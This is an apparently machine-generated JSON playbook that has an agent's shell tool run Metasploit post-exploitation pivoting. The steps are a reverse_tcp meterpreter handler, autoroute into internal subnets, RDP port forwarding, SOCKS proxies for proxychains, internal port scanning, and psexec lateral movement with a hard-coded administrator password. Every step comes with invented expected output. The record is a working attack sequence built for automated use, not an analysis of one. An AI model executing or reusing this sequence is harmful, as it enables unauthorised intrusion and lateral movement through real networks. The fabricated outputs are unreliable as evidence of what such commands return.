{
  "name": "metasploit_pivoting_routing",
  "description": "Metasploit Framework pivoting with routes and port forwarding",
  "pattern": "metasploit.*pivot|meterpreter.*route|autoroute|portfwd",
  "parameters": ["session_id", "target_subnet", "port"],
  "sequence": [
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.10.14.50; set LPORT 4444; exploit -j'"]},
      "expected_output": {"type": "string", "example": "[*] Started reverse TCP handler on 10.10.14.50:4444\n[*] Exploit running as background job 0\n\n[*] Sending stage (175174 bytes) to 10.10.10.100\n[*] Meterpreter session 1 opened (10.10.14.50:4444 -> 10.10.10.100:49823)\n\nmsf6 exploit(multi/handler) > sessions -i 1\n[*] Starting interaction with 1...\n\nmeterpreter > sysinfo\nComputer        : PIVOT-DMZ-01\nOS              : Windows Server 2019 (10.0 Build 17763)\nArchitecture    : x64\nSystem Language : en_US\nMeterpreter     : x64/windows\n\nmeterpreter > ipconfig\n\nInterface  1\n============\nName         : Ethernet0\nHardware MAC : 00:0c:29:a1:b2:c3\nIPv4 Address : 10.10.10.100\nIPv4 Netmask : 255.255.255.0\n\nInterface  2\n============\nName         : Ethernet1\nHardware MAC : 00:0c:29:a1:b2:c4\nIPv4 Address : 192.168.10.5\nIPv4 Netmask : 255.255.255.0\n\nDual-homed host identified!\nCan pivot to 192.168.10.0/24 network"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'run autoroute -s 192.168.10.0/24 -n 255.255.255.0' | msfconsole -q"]},
      "expected_output": {"type": "string", "example": "meterpreter > run autoroute -s 192.168.10.0/24 -n 255.255.255.0\n[*] Adding a route to 192.168.10.0/255.255.255.0...\n[+] Added route to 192.168.10.0/255.255.255.0 via 10.10.10.100\n[*] Use the -p option to list all active routes\n\nmeterpreter > run autoroute -p\n\nActive Routing Table\n====================\n\n   Subnet             Netmask            Gateway\n   ------             -------            -------\n   192.168.10.0       255.255.255.0      Session 1\n\n[*] Route added successfully\n\nMetasploit can now target 192.168.10.0/24:\n  use auxiliary/scanner/portscan/tcp\n  set RHOSTS 192.168.10.0/24\n  set THREADS 10\n  run\n\nAll modules route through Meterpreter session 1"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo -e 'sessions -i 1\\nportfwd add -l 3389 -p 3389 -r 192.168.10.20' | msfconsole -q"]},
      "expected_output": {"type": "string", "example": "meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.10.20\n[*] Local TCP relay created: :3389 <-> 192.168.10.20:3389\n[*] Port forward successfully added\n\nmeterpreter > portfwd list\n\nActive Port Forwards\n====================\n\n   Index  Local         Remote        Direction\n   -----  -----         ------        ---------\n   1      0.0.0.0:3389  192.168.10.20:3389  Forward\n\n[*] 1 total active port forwards.\n\nAccess forwarded RDP:\n  rdesktop 127.0.0.1:3389\n  xfreerdp /v:127.0.0.1:3389 /u:administrator /p:password\n\nTraffic flow:\n  Attacker:3389 -> Meterpreter Session 1 -> 192.168.10.20:3389\n\nDelete forward:\n  portfwd delete -l 3389 -p 3389 -r 192.168.10.20"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo -e 'use auxiliary/server/socks_proxy\\nset SRVHOST 127.0.0.1\\nset SRVPORT 1080\\nset VERSION 5\\nrun -j' | msfconsole -q"]},
      "expected_output": {"type": "string", "example": "[*] Auxiliary module running as background job 0.\n[*] Starting the SOCKS proxy server on 127.0.0.1:1080\n[*] SOCKS proxy server started (SOCKS5)\n\nmsf6 auxiliary(server/socks_proxy) > sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                     Information\n  --  ----  ----                     -----------\n  1         meterpreter x64/windows  PIVOT-DMZ-01\\SYSTEM @ PIVOT-DMZ-01\n\nSOCKS proxy configuration:\n  Host: 127.0.0.1\n  Port: 1080\n  Version: SOCKS5\n\nConfigure proxychains (/etc/proxychains4.conf):\n  socks5 127.0.0.1 1080\n\nUse with tools:\n  proxychains nmap -sT 192.168.10.0/24\n  proxychains crackmapexec smb 192.168.10.0/24\n  proxychains impacket-psexec administrator@192.168.10.20\n\nAll traffic routes through Meterpreter session 1"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo -e 'use auxiliary/scanner/portscan/tcp\\nset RHOSTS 192.168.10.0/24\\nset PORTS 22,80,443,445,3389\\nset THREADS 10\\nrun' | msfconsole -q"]},
      "expected_output": {"type": "string", "example": "[*] 192.168.10.5:445 - TCP OPEN\n[*] 192.168.10.5:3389 - TCP OPEN\n[*] 192.168.10.10:445 - TCP OPEN\n[*] 192.168.10.10:3389 - TCP OPEN\n[*] 192.168.10.20:22 - TCP OPEN\n[*] 192.168.10.20:80 - TCP OPEN\n[*] 192.168.10.20:443 - TCP OPEN\n[*] 192.168.10.20:3389 - TCP OPEN\n[*] 192.168.10.30:445 - TCP OPEN\n[*] 192.168.10.50:22 - TCP OPEN\n[*] 192.168.10.50:80 - TCP OPEN\n[*] Scanned 256 of 256 hosts (100% complete)\n[*] Auxiliary module execution completed\n\nDiscovered hosts:\n  192.168.10.5   - Windows (SMB, RDP)\n  192.168.10.10  - Windows (SMB, RDP) - Likely DC\n  192.168.10.20  - Linux/Windows (SSH, HTTP, HTTPS, RDP)\n  192.168.10.30  - Windows (SMB)\n  192.168.10.50  - Linux (SSH, HTTP)\n\nNext steps:\n  use auxiliary/scanner/smb/smb_version\n  set RHOSTS 192.168.10.10\n  run"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo -e 'use exploit/windows/smb/psexec\\nset RHOSTS 192.168.10.20\\nset SMBUser administrator\\nset SMBPass P@ssw0rd123\\nset payload windows/meterpreter/bind_tcp\\nset LPORT 4445\\nexploit' | msfconsole -q"]},
      "expected_output": {"type": "string", "example": "[*] Started bind TCP handler against 192.168.10.20:4445\n[*] 192.168.10.20:445 - Connecting to the server...\n[*] 192.168.10.20:445 - Authenticating to 192.168.10.20:445 as user 'administrator'...\n[*] 192.168.10.20:445 - Selecting PowerShell target\n[*] 192.168.10.20:445 - Executing the payload...\n[*] Sending stage (175174 bytes) to 192.168.10.20\n[*] Meterpreter session 2 opened (192.168.10.5:49824 -> 192.168.10.20:4445)\n\nmeterpreter > sysinfo\nComputer        : WEB-SERVER-01\nOS              : Windows Server 2016 (10.0 Build 14393)\nArchitecture    : x64\nSystem Language : en_US\nMeterpreter     : x64/windows\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n\nPivot chain established:\n  Attacker (10.10.14.50)\n    -> Session 1: PIVOT-DMZ-01 (10.10.10.100 / 192.168.10.5)\n      -> Session 2: WEB-SERVER-01 (192.168.10.20)\n\nTwo active Meterpreter sessions:\n  sessions -l"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo -e 'sessions -i 2\\nrun autoroute -s 172.16.5.0/24\\nbackground\\nuse auxiliary/server/socks_proxy\\nset SRVPORT 1081\\nrun -j' | msfconsole -q"]},
      "expected_output": {"type": "string", "example": "meterpreter > run autoroute -s 172.16.5.0/24\n[*] Adding a route to 172.16.5.0/255.255.255.0...\n[+] Added route to 172.16.5.0/255.255.255.0 via 192.168.10.20\n\nmeterpreter > background\n[*] Backgrounding session 2...\n\nmsf6 > use auxiliary/server/socks_proxy\nmsf6 auxiliary(server/socks_proxy) > set SRVPORT 1081\nSRVPORT => 1081\nmsf6 auxiliary(server/socks_proxy) > run -j\n[*] Auxiliary module running as background job 1.\n[*] Starting the SOCKS proxy server on 127.0.0.1:1081\n\nActive routes:\n  192.168.10.0/24 -> Session 1\n  172.16.5.0/24   -> Session 2\n\nSOCKS proxies:\n  Port 1080: Access 192.168.10.0/24 via Session 1\n  Port 1081: Access 172.16.5.0/24 via Session 2\n\nMulti-hop pivoting:\n  Attacker -> Pivot 1 (Session 1) -> Pivot 2 (Session 2) -> 172.16.5.0/24\n\nProxychains config:\n  socks5 127.0.0.1 1081\n  proxychains nmap -sT 172.16.5.0/24"}
    }
  ],
  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
  "created_by": "neural_mesh_v5.2_generator"
}
